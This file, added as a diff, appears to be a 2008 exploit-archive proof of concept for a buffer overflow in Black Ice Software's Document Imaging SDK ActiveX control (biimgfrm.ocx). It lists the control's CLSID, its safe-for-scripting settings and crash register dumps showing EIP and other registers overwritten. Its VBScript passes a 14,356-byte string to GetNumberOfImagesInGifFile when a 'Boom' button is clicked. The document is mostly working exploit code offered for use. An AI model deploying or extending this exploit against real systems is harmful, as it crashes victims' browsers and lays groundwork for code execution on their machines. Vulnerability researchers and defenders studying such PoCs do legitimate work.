@@ -1,0 +1,57 @@
+<!--
+Document Imaging SDK Buffer Overflow Vulnerability
+
+               DoS Proof of concept
+
+Author: r0ut3r
+Mail  : writ3r [at] gmail.com
+-----------------------------
+-Tested on WinXP Pro SP2
+
+Version: 10.95
+
+
+Vendor : Black Ice Software
+
+Price  : $999
+
+File : biimgfrm.ocx
+CLSID: {79956462-F148-497F-B247-DF35A095F80B}
+
+DLL Settings: 
+RegKey Safe for Script: True
+RegKey Safe for Init  : True
+KillBitSet            : False
+
+Register: 
+
+
+
+EIP 7C91B3FB -> Asc: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+EAX 001919C0 -> Asc: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+EBX 41414141
+ECX 00004141
+EDX 00150168 -> 00000000
+EDI 41414141
+
+
+
+ESI 001919B8 -> Asc: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+EBP 0013EA20 -> 0013EAA4
+ESP 0013E804 -> 0000021A
+-----------------------------
+-->
+<object classid='clsid:79956462-F148-497F-B247-DF35A095F80B' id='test'></object>
+
+
+
+<script language='vbscript'>
+ Sub Boom
+    buff = String(14356, "A")
+    test.GetNumberOfImagesInGifFile buff
+
+ End Sub
+</script>
+<input type=button onclick=Boom() value='Boom?'>
+
+# milw0rm.com [2008-07-15]
